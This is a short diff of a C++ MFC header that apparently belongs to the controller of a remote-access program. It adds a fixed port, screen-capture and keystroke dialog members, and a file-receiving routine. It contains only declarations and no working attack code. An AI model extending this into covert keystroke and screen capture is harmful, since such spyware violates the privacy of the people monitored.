@@ -11,7 +11,13 @@
 #define KSTR 4
 #define BDIR 5
 
+#define PRE_AGREED_PORT     8686
+#define RECV_BUFFER_SIZE    4096
+
 #include "ClientDoc.h"
+
+#include "CapScreenDlg.h"
+#include "KeystrokeDlg.h"
 
 
 
@@ -67,6 +73,14 @@ public:
 	void AddMsg(CString strMessage);
 	void InitButtons();
 	void UpdateButtons();	
+public:
+	// functions for capturing the screen
+	CCapScreenDlg m_dlgCSCR;
+	BOOL ReceiveFile();
+	void ShowImageDialog();
+public:
+	// functions for keystroke
+	CKeystrokeDlg m_dlgKSTR;
 };
 
 #ifndef _DEBUG  // debug version in ClientView.cpp
